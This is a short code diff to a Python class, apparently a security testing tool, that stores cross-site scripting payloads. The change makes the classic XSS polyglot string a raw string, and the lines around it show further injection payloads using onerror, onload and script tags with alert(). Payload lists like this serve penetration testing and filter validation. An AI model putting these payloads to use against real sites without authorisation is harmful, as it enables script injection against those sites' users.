@@ -47,7 +47,7 @@ class XSSPayloads:
                 '"><object onerror=alert(1)>',
             ],
             'polyglot': [
-                'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//<stYle/onload=alert()>//',
+                r'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//<stYle/onload=alert()>//',
                 '"><img src=x onerror=alert(1)><img src=x onerror=alert(1)>',
                 '"><svg/onload=alert(1)><svg/onload=alert(1)>',
                 '"><script>alert(1)</script><script>alert(1)</script>',
